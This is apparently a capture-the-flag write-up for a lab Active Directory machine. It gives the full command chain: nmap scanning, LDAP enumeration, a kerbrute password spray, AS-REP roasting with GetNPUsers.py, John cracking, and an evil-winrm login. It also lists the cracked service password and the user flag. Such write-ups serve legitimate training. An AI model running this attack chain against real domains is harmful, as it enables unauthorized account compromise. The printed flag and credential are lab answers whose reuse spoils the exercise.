
Initial scan with nmap came out with several results
Command:
```
nmap -sV -Pn -T4 10.10.10.161 -p-
```
Found a ldap service opened on port 389 and decided to to use the command:
```
ldapsearch -H ldap://10.10.10.161 -x -s base '' "(objectClass=*)" "*" +
```
Next we check for a null-bund on the LDAP.

```
ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local
```
For user enumeration I use the commands:
```
ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local "(objectClass=person)" | grep "sAMAccountName:"

enum4linux -v 10.10.10.161
```
With this search I was able to find a user svc-alfresco. 
After this we did a kerberos password spray attack with the kerbrute tool.

```
 ./kerbrute passwordspray -d htb.local --dc 10.10.10.161 user.txt 'password123' -v
```
With this attack we were able to find out that the user svc-alfresco did not need pre authentication
After the spray we did a AS-REP Roasting attack on the machine with the GetNPUsers script

```
./GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161
```
This command gave us a hash which we then used John to crack.

```
john --wordlist=~/rockyou.txt alf.hash
```
We got the password for svc-alfresco:s3rvice.
After gaining the password we used the binary 
Evil-WinRM:
```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```
With that we gained initial access and found the user flag on the desktop

user flag: 3d6a7c6a450f8c07b30261ca85b42ca0
